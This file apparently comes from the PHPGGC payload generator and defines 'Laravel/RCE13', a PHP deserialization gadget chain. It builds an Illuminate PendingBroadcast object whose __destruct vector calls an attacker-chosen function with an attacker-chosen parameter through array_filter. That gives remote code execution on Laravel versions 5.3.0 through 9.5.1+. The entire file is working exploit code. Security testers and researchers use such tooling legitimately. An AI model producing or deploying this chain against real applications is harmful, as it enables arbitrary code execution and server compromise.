<?php

namespace GadgetChain\Laravel;

class RCE13 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.3.0 <= 9.5.1+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'use array_filter (can also use array_walk)';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        $a = new \Illuminate\Broadcasting\PendingBroadcast($function, $param);

        return $a;
    }
}
